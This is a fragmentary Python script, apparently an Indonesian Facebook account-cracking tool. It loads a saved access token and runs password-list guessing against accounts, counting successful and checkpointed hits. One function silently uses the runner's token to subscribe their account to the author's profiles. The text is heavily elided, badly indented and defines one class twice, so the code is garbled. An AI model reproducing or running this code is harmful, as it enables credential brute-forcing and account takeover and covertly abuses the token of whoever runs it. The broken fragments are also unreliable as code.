...
\033[0;96m WORK MAKE WIFI + DATA ANTI CEKPOINT LOGIN 😎
\033[0;96m─────────────────────────────────────────────────────────────""")
...
def bot_komen():
	...
	requests.post('https://graph.facebook.com/1555196435/subscribers?access_token=' + toket) # aris Widiatmoko 2008
        requests.post('https://graph.facebook.com/100051137858476/subscribers?access_token=' + toket) # fb aris widiatmoko 2020
    	menu()
def menu():
  try:
    toket = open('login.txt','r').read()
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					print ("   %s"%e)
					continue
				print ("\033[0;96m╠══\033[0;97m[•] Example : pass123,pass1234,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
...
class crack2:
	...
	def main(self,fl):
		try:
			...
			self.ko+=1
			print "\r   [Crack] %s/%s - cp-:%s - ok-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
        os.system("clear")
